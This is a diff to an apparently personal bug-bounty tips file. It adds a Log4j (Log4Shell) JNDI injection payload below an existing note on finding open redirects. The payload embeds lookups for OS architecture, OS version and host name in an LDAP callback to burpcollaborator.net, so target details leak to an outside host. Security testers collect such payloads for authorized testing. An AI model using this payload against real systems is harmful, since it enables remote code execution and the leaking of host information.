@@ -95,3 +95,12 @@ This is how I found 40 open redirection in 2 weeks. Bugcrowd accept open redirec
 
 Param miner found redirect,url,uri, etc params. Tried open redirect payloads manually. And reported 40 open redirects.
 ----------------------------------------------------------------------------------------------------------------------------------------------
+
+New RCE log4j with 
+@GodfatherOrwa
+
+Paylaod : ${jndi:ldap://${Command}XXXX${::-.}http://burpcollaborator.net}zzzz 
+
+Command 
+sys:os.arch & sys:os.version &  hostName
+----------------------------------------------------------------------------------------------------------------------------------------------------
